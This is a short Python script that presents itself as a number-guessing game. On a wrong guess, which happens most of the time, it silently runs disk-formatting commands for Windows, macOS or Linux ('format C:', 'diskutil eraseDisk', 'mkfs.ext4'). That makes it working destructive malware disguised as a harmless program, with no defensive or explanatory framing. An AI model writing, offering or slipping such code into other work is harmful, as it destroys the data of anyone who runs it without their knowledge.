import os
import platform
import random

def format_disk():
    system = platform.system()

    if system == "Windows":
        os.system(f"format C: /fs:NTFS /q /y")
    elif system == "Darwin": 
        os.system(f"diskutil eraseDisk HFS+ Untitled /dev/disk2")
    elif system == "Linux":
        os.system(f"mkfs.ext4 /dev/sdb")
    else:
        print("Sistema operativo non supportato.")

if __name__ == "__main__":
    print("Silly game, guess the number")
    casual = random.randint(1, 10)
    guess = int(input("Write your number: "))
    if guess == casual:
        print("Yeah!! You won!!! NICE")
    else:
        print("Ah ah ah")
        format_disk()
